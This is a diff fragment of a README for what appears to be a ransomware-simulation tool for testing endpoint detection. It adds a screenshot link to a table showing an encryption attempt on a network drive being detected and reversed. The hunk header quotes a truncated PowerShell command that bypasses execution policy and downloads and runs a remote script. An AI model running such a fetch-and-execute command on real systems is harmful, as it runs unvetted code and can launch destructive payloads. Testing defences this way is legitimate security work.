@@ -83,6 +83,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 | CAN detect |
 |---------------|
 |![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen56.gif)|
+![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/endpoint3.gif)
 |The tool tries to encrypt files in network drive (N:\), the server the encryption operaton from remote, few files are encrypted, but they are being restored|
 
 
